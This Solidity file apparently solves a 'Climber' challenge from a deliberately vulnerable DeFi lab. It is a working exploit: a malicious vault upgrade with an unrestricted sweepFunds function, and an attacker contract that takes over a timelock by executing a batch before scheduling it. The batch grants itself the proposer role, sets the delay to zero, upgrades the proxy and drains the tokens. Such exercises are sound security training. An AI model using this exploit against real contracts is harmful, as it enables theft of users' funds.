// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "./ClimberTimelock.sol";
import "hardhat/console.sol";

contract ClimberVaultUpgraded is
    Initializable,
    OwnableUpgradeable,
    UUPSUpgradeable
{
    function sweepFunds(address tokenAddress, address recipient) public {
        IERC20 token = IERC20(tokenAddress);
        require(
            token.transfer(recipient, token.balanceOf(address(this))),
            "Transfer failed"
        );
    }

    function _authorizeUpgrade(address newImplementation)
        internal
        override
        onlyOwner
    {}
}

contract ClimberVaultAttacker {
    address[] targets;
    uint256[] values;
    bytes[] dataElements;
    ClimberTimelock timeLock;
    ClimberVaultUpgraded upgradedClimber;

    function _push(address targetAddr, bytes memory data) internal {
        targets.push(targetAddr);
        values.push(0);
        dataElements.push(data);
    }

    function attack(
        address payable _timelock,
        address _proxy,
        address tokenAddr,
        address recipient
    ) external {
        upgradedClimber = new ClimberVaultUpgraded();

        timeLock = ClimberTimelock(_timelock);
        _push(
            address(timeLock),
            abi.encodeWithSelector(
                AccessControl.grantRole.selector,
                timeLock.PROPOSER_ROLE(),
                address(this)
            )
        );

        _push(
            address(timeLock),
            abi.encodeWithSelector(
                ClimberTimelock.updateDelay.selector,
                uint64(0)
            )
        );
        _push(
            _proxy,
            abi.encodeWithSelector(
                UUPSUpgradeable.upgradeToAndCall.selector,
                address(upgradedClimber),
                abi.encodeWithSelector(
                    upgradedClimber.sweepFunds.selector,
                    tokenAddr,
                    recipient
                )
            )
        );

        _push(
            address(this),
            abi.encodeWithSelector(ClimberVaultAttacker.scheduler.selector)
        );

        timeLock.execute(targets, values, dataElements, bytes32(0));
    }

    function scheduler() external {
        timeLock.schedule(targets, values, dataElements, bytes32(0));
    }
}
